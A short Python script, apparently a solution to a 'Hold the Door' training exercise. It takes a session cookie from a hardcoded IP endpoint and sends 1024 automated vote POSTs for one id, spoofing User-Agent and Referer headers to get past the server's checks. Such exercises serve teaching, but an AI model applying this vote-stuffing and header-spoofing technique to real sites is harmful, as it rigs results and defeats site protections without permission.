#!/usr/bin/python3

import requests
import sys

# The id is hardcoded
id = 3337

# Set the endpoint
URI = "http://158.69.76.135/level2.php"

# Get cookie
response = requests.post(URI)
key = response.cookies["HoldTheDoor"]

# Set the form data
data = {
    'id': id,
    'holdthedoor': 'submit',
    "key": key
}

# Make him think it's Windows
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) \
(KHTML, like Gecko) Chrome/77.0.3865.120',
    'Referer': 'http://158.69.76.135/level2.php'
}

for i in range(0, 1024):
    # Send POST request
    response = requests.post(URI, data=data,
                             cookies={"HoldTheDoor": key}, headers=headers)
    print("POST " + str(i + 1) + " HTTP result: " + str(response))
